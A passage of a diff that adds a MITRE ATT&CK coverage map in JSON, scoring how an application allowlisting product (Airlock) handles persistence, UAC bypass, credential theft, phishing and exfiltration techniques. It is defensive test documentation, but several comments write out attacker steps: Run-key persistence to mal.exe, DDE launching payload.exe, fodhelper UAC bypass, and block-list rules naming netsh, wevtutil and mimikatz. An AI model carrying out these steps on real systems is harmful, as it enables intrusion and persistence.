+      "techniqueID": "T1546.003",
+      "score": 1,
+      "comment": "WMI event subscription. Payload launched by wmiprvse must be trusted. Script payloads via script control. | Test: WMI event sub launching unsigned exe -> blocked when event fires. | Limitations: Subscription creation not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.007",
+      "score": 1,
+      "comment": "Netsh helper DLL. Must be trusted to load. | Test: netsh add helper unsigned.dll -> blocked at load. | Limitations: netsh.exe trusted; DLL registration succeeds, load blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.008",
+      "score": 1,
+      "comment": "Accessibility features (sethc.exe, utilman.exe). Replacement binary must be trusted by hash. Blocklist metarule on original_filename catches renamed trusted tools (e.g., cmd.exe renamed to sethc.exe). | Test: Replace sethc.exe with untrusted binary -> blocked at lock screen activation. Blocklist original_filename 'cmd' -> catches cmd.exe renamed to sethc.exe. | Limitations: If attacker copies a trusted binary with matching hash, it runs. Original filename metarule is the defense against renamed ",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.009",
+      "score": 1,
+      "comment": "AppCert DLLs. Loaded into every CreateProcess caller. Must be trusted. | Test: Register untrusted AppCert DLL -> blocked at load. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.010",
+      "score": 1,
+      "comment": "AppInit DLLs. Loaded into user-mode processes. Must be trusted. | Test: Register untrusted AppInit DLL -> blocked. | Limitations: Disabled by default with Secure Boot.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.011",
+      "score": 1,
+      "comment": "Application shimming. sdbinst.exe can be blocklisted. Shim-loaded DLLs must be trusted. | Test: 1) Blocklist sdbinst.exe. 2) Shim loading untrusted DLL -> blocked. | Limitations: If shim redirects to trusted binary, not inspected.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.012",
+      "score": 1,
+      "comment": "IFEO debugger. Debugger binary must be trusted. | Test: IFEO debugger set to unsigned exe -> blocked when target launched. | Limitations: Reg mod not prevented. Trusted debugger (cmd.exe) runs.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.013",
+      "score": 1,
+      "comment": "PowerShell profile. profile.ps1 must be trusted via script control. | Test: Drop malicious profile.ps1 -> blocked at PS startup if untrusted. | Limitations: If profile is path-trusted, runs. Audit path rules.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.015",
+      "score": 1,
+      "comment": "COM hijacking. Malicious DLL registered as COM object. Must be trusted. | Test: Untrusted DLL as COM object -> blocked when instantiated. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.016",
+      "score": 1,
+      "comment": "Installer packages (MSI). Blocked via script control (MSI is covered type). | Test: Drop untrusted .msi -> blocked. | Limitations: Trusted-signed MSIs from trusted publishers install normally.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1546.018",
+      "score": 1,
+      "comment": "Python startup hooks. Python interpreter must be allowlisted. Startup hook .py must be trusted via script control. | Test: 1) python.exe not allowlisted -> blocked. 2) Untrusted startup .py -> blocked. | Limitations: If python trusted and hook in trusted path, runs.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547",
+      "score": 1,
+      "comment": "Autostart registration (reg keys, startup folder) not prevented. Payload blocked at boot/logon when execution is attempted. | Test: reg add HKCU\\...\\Run /v evil /d C:\\Temp\\mal.exe -> registration succeeds, mal.exe blocked at logon. | Limitations: Registration mechanism not prevented. Airlock controls the execution of the payload, not the persistence setup.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.001",
+      "score": 1,
+      "comment": "Registry Run keys / Startup folder. Target exe must be trusted. | Test: 1) Run key to unsigned exe -> blocked at logon. 2) Startup folder shortcut to unsigned exe -> blocked. | Limitations: Reg/folder modification not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.002",
+      "score": 1,
+      "comment": "Authentication package DLL. Loaded by lsass. Must be trusted. | Test: Register untrusted auth package DLL -> blocked at load. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.003",
+      "score": 1,
+      "comment": "Time providers DLL. Loaded by w32time. Must be trusted. | Test: Register untrusted time provider DLL -> blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.004",
+      "score": 1,
+      "comment": "Winlogon helper DLL. Loaded at logon. Must be trusted. | Test: Untrusted Winlogon helper DLL -> blocked at logon. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.005",
+      "score": 1,
+      "comment": "Security Support Provider DLL. Loaded by lsass. Must be trusted. | Test: Untrusted SSP DLL -> blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.008",
+      "score": 1,
+      "comment": "Attackers register a malicious driver or DLL to be loaded by the LSASS process at boot (e.g., SSP, authentication package). LSASS itself is not blocked - it's a critical Windows process. The untrusted driver/DLL that LSASS tries to load IS blocked by DLL control. Microsoft Recommended Driver Block Rules predefined blocklist covers known malicious drivers even if signed. | Test: 1) Register untrusted DLL as authentication package via registry -> DLL blocked when LSASS loads it at boot. 2) Import ",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.009",
+      "score": 1,
+      "comment": "Shortcut modification. Target exe must be trusted. | Test: Modified shortcut to unsigned exe -> blocked when used. | Limitations: Shortcut modification not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.010",
+      "score": 1,
+      "comment": "Port monitors DLL. Loaded by spoolsv.exe. Must be trusted. | Test: Untrusted port monitor DLL -> blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.012",
+      "score": 1,
+      "comment": "Print processors DLL. Loaded by spoolsv.exe. Must be trusted. | Test: Untrusted print processor DLL -> blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1547.014",
+      "score": 1,
+      "comment": "Active Setup. StubPath exe must be trusted. | Test: Active Setup StubPath to unsigned exe -> blocked at logon. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1548",
+      "score": 1,
+      "comment": "UAC bypass techniques often involve DLL hijacking in auto-elevate apps or registry modification pointing to untrusted payload. DLL control blocks hijacked DLLs. Untrusted payloads from registry-based bypasses blocked. | Test: 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked. | Limitations: Registry-based bypasses where payload is a trusted binary (cmd.exe) succeed \u2014 use blocklist to restrict.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1548.002",
+      "score": 1,
+      "comment": "UAC bypass. Various methods: DLL hijacking in auto-elevate apps (DLL must be trusted), mock trusted dirs, fodhelper.exe registry abuse. DLL hijack UAC bypasses caught by DLL control. Registry-based UAC bypasses using trusted auto-elevate binaries: the trusted binary runs, but any untrusted payload it loads is blocked. | Test: 1) UAC bypass via DLL hijack in auto-elevate app -> DLL blocked. 2) fodhelper.exe reg key to unsigned exe -> exe blocked. 3) Blocklist common UAC bypass tools. | Limitation",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1550",
+      "score": 0,
+      "comment": "Use alternate auth material (parent). Credential reuse. Identity plane. | Limitations: Post-auth, tools attacker runs are checked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1550.002",
+      "score": 0,
+      "comment": "Pass the hash. Credential technique. No new file execution required if using trusted tools. | Limitations: If PtH tool (mimikatz) is untrusted, tool itself blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1550.003",
+      "score": 0,
+      "comment": "Pass the ticket. Same as PtH.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1552",
+      "score": 0,
+      "comment": "Unsecured credentials (parent). Reading files/registry for credentials. Data access via trusted tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1552.001",
+      "score": 0,
+      "comment": "Credentials in files. Reading files. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1552.002",
+      "score": 0,
+      "comment": "Credentials in registry. reg query. Trusted tool.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1552.003",
+      "score": 0,
+      "comment": "Shell history. Reading history files. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1552.004",
+      "score": 0,
+      "comment": "Private keys. Reading key files. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1552.006",
+      "score": 0,
+      "comment": "Group policy preferences. Reading GPP XML. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1553",
+      "score": 0,
+      "comment": "Subvert trust controls. Techniques targeting trust verification mechanisms. Airlock performs its own trust verification independent of Windows, but this is about undermining trust models broadly. | Limitations: Publisher trust compromise (attacker gets valid code signing cert) is the fundamental risk. See T1553.002.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1553.002",
+      "score": 0,
+      "comment": "Code signing. Attacker signs malware with legitimate cert. If that cert's publisher is trusted in Airlock, malware passes. This is a fundamental trust model risk for publisher-based trust. | Test: Malware signed by trusted publisher -> allowed. Unsigned -> blocked. | Limitations: Publisher trust trade-off. Hash trust is more granular but harder to manage.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1553.003",
+      "score": 0,
+      "comment": "SIP/Trust Provider hijacking modifies Windows signature verification. Airlock's own publisher verification may use independent path, but this needs lab validation. | Test: Needs lab testing to confirm Airlock's signature verification independence from SIP providers. | Limitations: Uncertain. Treat as not covered until validated.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1553.004",
+      "score": 0,
+      "comment": "Install root certificate. Adding trusted CA. Airlock publisher trust verifies code signing certificates, not web/TLS certs. Custom code signing certs trusted by Airlock are explicitly added by admin. | Test: N/A - Airlock admin must explicitly trust publishers. | Limitations: Airlock doesn't auto-trust based on system cert store for execution decisions.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1553.005",
+      "score": 0,
+      "comment": "Mark-of-the-Web bypass. MOTW is a Windows security feature. Airlock doesn't rely on MOTW for trust decisions - it hashes files regardless. | Test: File with or without MOTW -> Airlock hashes and checks regardless. | Limitations: MOTW bypass is irrelevant to Airlock's enforcement model.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1553.006",
+      "score": 0,
+      "comment": "Code signing policy modification. Modifying Windows code signing enforcement. Airlock's enforcement is independent of Windows code signing policy. | Test: Airlock enforces regardless of Windows code signing policy state. | Limitations: Airlock operates its own trust model.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1554",
+      "score": 1,
+      "comment": "Replacing a trusted binary with malicious version. If hash changes (it will), new binary must be trusted. Publisher trust: if attacker signs with different cert, blocked. | Test: Replace trusted app exe with unsigned version -> blocked on next launch (hash mismatch). | Limitations: If trusted by path rule (not hash), replacement at same path may run. Prefer hash/publisher trust over path rules.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1555",
+      "score": 0,
+      "comment": "Credentials from password stores. Accessing browser/OS credential stores via trusted tools/APIs. | Limitations: If standalone cred extraction tool is untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1555.003",
+      "score": 0,
+      "comment": "Credentials from web browsers. Browser data access.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1555.004",
+      "score": 0,
+      "comment": "Windows credential manager. API-based access.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1555.005",
+      "score": 0,
+      "comment": "Password managers. Application-level access.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1556",
+      "score": 0,
+      "comment": "Modify authentication process. Modifies login/auth mechanisms. Some sub-techniques involve DLL loading. | Test: See sub-techniques.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1556.001",
+      "score": 1,
+      "comment": "Domain controller auth DLL. Password filter loaded by lsass. Must be trusted. | Test: Untrusted password filter DLL on DC -> blocked. | Limitations: DC/server focused.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1556.002",
+      "score": 1,
+      "comment": "Password filter DLL. Loaded by lsass on password change. Must be trusted. | Test: Untrusted password filter DLL -> blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1556.005",
+      "score": 0,
+      "comment": "Reversible encryption. AD policy change. No file execution. | Limitations: AD security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1556.006",
+      "score": 0,
+      "comment": "MFA interception. Identity plane. | Limitations: MFA security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1556.007",
+      "score": 0,
+      "comment": "Hybrid identity. Cloud/identity plane.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1556.008",
+      "score": 1,
+      "comment": "Network provider DLL. Loaded at logon. Must be trusted. | Test: Untrusted network provider DLL -> blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1557",
+      "score": 1,
+      "comment": "AitM tools (Responder, Inveigh, ettercap, bettercap) must be trusted. Blocked by default-deny. Inveigh as PS script: restricted by script control + PS blocklist for non-admins. | Test: 1) Responder.exe -> blocked (untrusted). 2) Inveigh.ps1 -> blocked by script control. 3) Blocklist PS for non-admins -> prevents Inveigh via PS.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1557.001",
+      "score": 1,
+      "comment": "LLMNR/NBT-NS poisoning tools blocked by default-deny. Inveigh restricted by script control + PS blocklist. | Test: Responder -> blocked. Inveigh.ps1 -> script control. Blocklist PS for non-admins.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1557.002",
+      "score": 1,
+      "comment": "ARP spoofing tools (arpspoof, ettercap, bettercap) must be trusted. Blocked by default-deny. | Test: ARP spoofing tool not allowlisted -> blocked. | Limitations: No built-in Windows ARP spoofing capability.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1557.003",
+      "score": 0,
+      "comment": "DHCP spoofing. Network-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1558",
+      "score": 0,
+      "comment": "Steal/forge Kerberos tickets. Network/AD protocol operations. | Limitations: If Kerberoasting tool is untrusted, tool blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1558.001",
+      "score": 0,
+      "comment": "Kerberos ticket forgery achievable with trusted tools/APIs. Mimikatz blocked. | Test: mimikatz -> blocked. | Limitations: Technique achievable with trusted tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1558.002",
+      "score": 0,
+      "comment": "Same as golden ticket. | Test: Tool -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1558.003",
+      "score": 0,
+      "comment": "Kerberoasting. Can be done with trusted PowerShell + .NET. | Limitations: Trusted interpreter + API = not caught.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1558.004",
+      "score": 0,
+      "comment": "AS-REP roasting. Same principle as Kerberoasting.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1559",
+      "score": 0,
+      "comment": "IPC mechanisms (COM, DDE, pipes) between trusted processes not monitored. New file loads from IPC ARE checked. | Test: N/A - IPC between trusted processes outside scope. | Limitations: New DLL/exe loads from IPC are checked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1559.001",
+      "score": 1,
+      "comment": "COM server DLLs must be trusted to load. When a COM object is instantiated, the DLL it points to is checked by DLL control. Untrusted COM DLL blocked at load time. This is the primary defense against COM abuse for execution. | Test: Register COM object pointing to unsigned DLL via registry -> DLL blocked when COM object instantiated by any process. | Limitations: COM automation between already-trusted processes using trusted DLLs is not monitored. Registry modification to register the COM object",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1559.002",
+      "score": 1,
+      "comment": "DDE in Office launches processes. Any process/payload launched via DDE must be trusted. Untrusted payload blocked. | Test: DDE in Word launching cmd /c C:\\Temp\\payload.exe -> cmd runs (trusted), payload.exe blocked. | Limitations: DDE data exchange between trusted apps not monitored.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1560",
+      "score": 0,
+      "comment": "Archive collected data (parent). Using archive tools. 7z/rar/zip tools must be trusted. | Test: Untrusted archiver -> blocked. Built-in tar/Compress-Archive trusted.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1560.001",
+      "score": 1,
+      "comment": "Standalone archiving tools (7z, WinRAR, rar) blocked by default-deny. Built-in tar.exe restrictable via blocklist. PowerShell Compress-Archive available if PS trusted. | Test: 1) 7z.exe not allowlisted -> blocked. 2) Blocklist tar.exe for non-admins. | Limitations: PowerShell Compress-Archive available if PS not blocklisted for user.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1560.002",
+      "score": 0,
+      "comment": "Archive via library. Using .NET/Python libraries from trusted process. In-process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1560.003",
+      "score": 0,
+      "comment": "Archive via custom method. Custom code in trusted process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1561",
+      "score": 1,
+      "comment": "Wiper tools blocked by default-deny. format.com restrictable via blocklist metarule. | Test: 1) Custom wiper -> blocked. 2) Blocklist format.com for non-admins. | Limitations: Direct disk access APIs from trusted process not caught. Blocklist limits tool availability.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1561.001",
+      "score": 1,
+      "comment": "Disk content wipe tools blocked. Restrictable via blocklist. | Test: Custom wiper -> blocked. Blocklist format.com.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1561.002",
+      "score": 1,
+      "comment": "MBR/disk structure wipe tools blocked by default-deny. | Test: Standalone MBR wiper -> blocked. | Limitations: Direct disk access from trusted process not caught.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1562",
+      "score": 1,
+      "comment": "Airlock agent has kernel-driver-based tamper protection. User-mode attempts to stop/modify the agent are prevented. | Test: Attempt to kill/stop Airlock service -> kernel driver prevents. Untrusted tools used to disable other security software -> tools blocked. | Limitations: Kernel-level attacks may bypass protection. Agent tamper protection is for user-mode tampering.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1562.001",
+      "score": 1,
+      "comment": "Disable or modify tools. Airlock agent protected by kernel driver. Attacker cannot stop/modify agent from user mode. Tools used to disable other security tools must be trusted. | Test: 1) Attempt to kill Airlock service -> protected by kernel driver. 2) Untrusted tool to disable Defender -> tool blocked. | Limitations: If attacker has kernel access, protection may be bypassed.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1562.002",
+      "score": 1,
+      "comment": "wevtutil.exe and auditpol.exe: restrict via blocklist metarule for non-admins. | Test: Metarule: blocklist wevtutil.exe AND auditpol.exe for non-admins. | Limitations: PowerShell and registry-based log disabling still possible if those tools are trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1562.003",
+      "score": 0,
+      "comment": "Impair command history logging. PS/shell config. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1562.004",
+      "score": 1,
+      "comment": "netsh.exe: restrict via blocklist metarule for non-admins. Prevents firewall rule manipulation. | Test: Metarule: original_filename 'netsh' AND user NOT admin -> blocks netsh advfirewall. | Limitations: PowerShell Set-NetFirewallProfile available if PS trusted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1562.006",
+      "score": 0,
+      "comment": "Indicator blocking. Preventing security tool data collection. Behavioral.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1562.009",
+      "score": 0,
+      "comment": "Safe mode boot may prevent Airlock kernel driver from loading depending on driver start type. Agent behavior in safe mode needs validation. | Test: Test Airlock agent behavior in safe mode \u2014 does the kernel driver load? | Limitations: Safe mode is an operational concern. If driver doesn't load in safe mode, no enforcement.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1562.010",
+      "score": 0,
+      "comment": "Downgrade attack. Forcing older versions of protocols/tools. No file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1562.011",
+      "score": 0,
+      "comment": "Spoof security alerting. Manipulating alert/log content. Behavioral.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1563",
+      "score": 0,
+      "comment": "Remote service session hijacking. Taking over existing session. No new file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1563.002",
+      "score": 0,
+      "comment": "RDP hijacking. Session takeover. No new file execution. | Limitations: Post-hijack, Airlock enforces.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564",
+      "score": 0,
+      "comment": "Hide artifacts (parent). Hiding files/processes/users. Cosmetic. Doesn't affect file trust. | Limitations: Hidden files still hashed and checked if executed.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.001",
+      "score": 1,
+      "comment": "Hidden files still hashed and checked when executed. Hidden attribute doesn't affect Airlock enforcement. | Test: attrib +h malware.exe -> execute -> blocked.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1564.002",
+      "score": 0,
+      "comment": "Hidden users. Identity operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.003",
+      "score": 0,
+      "comment": "Process with hidden window. Binary must be trusted but window visibility is cosmetic. | Limitations: Window visibility doesn't affect enforcement.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.004",
+      "score": 0,
+      "comment": "NTFS alternate data streams. Exe stored in ADS may or may not be intercepted by Airlock kernel driver at execution time. Needs lab validation. | Test: Test: store exe in ADS, execute via wmic/rundll32 -> validate Airlock intercepts. | Limitations: Uncertain coverage. Treat as not covered until validated.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.005",
+      "score": 0,
+      "comment": "Hidden file system. Execution from hidden FS should be intercepted by kernel driver but needs validation. | Limitations: Needs validation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.006",
+      "score": 1,
+      "comment": "VM software (QEMU, VirtualBox) must be allowlisted. If not trusted, blocked entirely. | Test: QEMU.exe not allowlisted -> blocked. VirtualBox not allowlisted -> blocked. | Limitations: If VM software is legitimately trusted, anything inside the VM is uncontrolled by host Airlock agent.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1564.007",
+      "score": 0,
+      "comment": "VBA stomping. Modifying VBA macro code in Office docs. Macro runs inside trusted Office. | Limitations: Dropped payloads blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.008",
+      "score": 0,
+      "comment": "Email hiding rules. Outlook rules. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.010",
+      "score": 0,
+      "comment": "Process argument spoofing. Modifying command line after process creation. In-process behavior.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.011",
+      "score": 0,
+      "comment": "Ignore process interrupts. Signal handling. In-process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1564.012",
+      "score": 0,
+      "comment": "File/path exclusions. Adding exclusions to security tools. Config operation. | Limitations: Airlock doesn't have user-configurable exclusions that could be abused this way.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1565",
+      "score": 0,
+      "comment": "Data manipulation. Modifying data. Data operation from trusted process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1565.001",
+      "score": 0,
+      "comment": "Stored data manipulation. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1565.002",
+      "score": 0,
+      "comment": "Transmitted data manipulation. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1565.003",
+      "score": 0,
+      "comment": "Runtime data manipulation. In-process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1566",
+      "score": 1,
+      "comment": "Phishing delivery not prevented. Payload execution blocked. This is the handoff: email security handles delivery, Airlock handles execution. | Test: User opens phishing email, runs attached payload -> blocked. | Limitations: Phishing delivery, social engineering, credential harvesting not in scope.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1566.001",
+      "score": 1,
+      "comment": "Spearphishing attachment. Attachment (exe/script/msi) must be trusted. Macro-enabled docs: doc opens, payload blocked. | Test: 1) .exe attachment -> blocked. 2) .js/.vbs attachment -> blocked via script control. 3) Macro doc drops exe -> exe blocked. | Limitations: Doc itself opens. Macro code runs inside Office.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1566.002",
+      "score": 1,
+      "comment": "Spearphishing link. Downloaded payload must be trusted to execute. | Test: Click link, download exe, run -> blocked. | Limitations: Link clicking and credential phishing pages not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1566.003",
+      "score": 1,
+      "comment": "Payload delivered via messaging service. Must be trusted to execute. | Test: Payload from Slack/Teams/LinkedIn -> blocked at execution. | Limitations: Delivery not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1566.004",
+      "score": 0,
+      "comment": "Spearphishing voice (vishing). Social engineering via phone. No file execution involved directly. | Limitations: If vishing leads to user running something, that execution is checked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1567",
+      "score": 0,
+      "comment": "Exfiltration over web service. Network. | Limitations: If exfil tool untrusted, blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1567.001",
+      "score": 0,
+      "comment": "Exfiltration to code repository. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1567.002",
+      "score": 0,
+      "comment": "Exfiltration to cloud storage. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1567.003",
+      "score": 0,
+      "comment": "Exfiltration to text storage. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1567.004",
+      "score": 0,
+      "comment": "Exfiltration over webhook. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1568",
+      "score": 0,
+      "comment": "Dynamic resolution. DNS-based. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1568.001",
+      "score": 0,
+      "comment": "Fast flux DNS. Network.",
